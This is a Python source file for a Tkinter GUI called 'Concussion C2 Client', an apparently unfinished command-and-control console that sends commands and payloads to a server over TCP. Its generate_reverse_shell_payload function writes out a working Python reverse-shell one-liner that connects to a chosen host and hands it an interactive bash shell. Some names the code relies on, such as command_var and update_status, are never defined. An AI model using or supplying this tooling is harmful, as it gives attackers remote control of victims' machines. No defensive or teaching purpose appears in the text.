import tkinter as tk
import socket
import threading
import argparse

# Create an argument parser to specify server IP and port
parser = argparse.ArgumentParser(description="Concussion C2 Client")
parser.add_argument('--server-ip', default='0.0.0.0', help="Server IP")
parser.add_argument('--server-port', type=int, default=8081, help="Server port")
args = parser.parse_args()

# Define the server's IP address and port
SERVER_IP = args.server_ip
SERVER_PORT = args.server_port

# Create the main application window
root = tk.Tk()
root.title("Concussion C2 Client")
root.geometry("700x500")  # Adjust the window size as needed

# Define the common color scheme
root.configure(bg="#000046")

# Function to handle the send command button click
def send_command():
    command = command_var.get()
    if command:
        if command.startswith("redirect"):
            # Handle a redirect command
            redirect_command, target_ip, target_port = command.split(' ')
            handle_redirect(target_ip, int(target_port))
            update_status(f"Redirected to {target_ip}:{target_port}.")
        else:
            send_request(command)


# Function to handle a redirect command
def handle_redirect(target_ip, target_port):
    global redirect_target
    redirect_target = (target_ip, target_port)

# Function to send a request to the server
def send_request(request):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_IP, SERVER_PORT))
        client_socket.send(request.encode('utf-8'))

        response_data = client_socket.recv(1024).decode('utf-8')
        response_label.config(text=response_data)

        client_socket.close()
    except Exception as e:
        print(f"Error: {e}")

def generate_reverse_shell_payload(ip, port):
    # Implement logic to generate a reverse shell payload
    payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
    return payload

def send_payload(payload):
    try:
        # Create a socket and establish a connection to the server
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_IP, SERVER_PORT))

        # Send the payload to the server
        client_socket.send(payload.encode('utf-8'))

        # Receive and process the response from the server (if applicable)
        response_data = client_socket.recv(1024).decode('utf-8')
        print(response_data)

        # Close the client socket
        client_socket.close()
    except Exception as e:
        print(f"Error: {e}")

        # Handle connection or other errors gracefully
        print(f"Server Status: Error - {e}")

# Add Labels and Headings (unchanged)
main_heading = tk.Label(root, text="Concussion C2 Client", font=("Helvetica", 16, "bold"), bg="#000046", fg="#00C8FF")
main_heading.pack(pady=(20, 10))

# Create a label for the server connection status
status_label = tk.Label(root, text="Server Status: Not Connected", font=("Helvetica", 16, "bold"), bg="#000046", fg="#41E67B")
status_label.pack(padx=10, pady=10)

# Enhance Button Styling (unchanged)
send_button = tk.Button(root, text="Send Command",font=("Helvetica", 16, "bold"), bg="#00FFEA", fg="#0000A2")
send_button.pack()

# Run the GUI application
root.mainloop()

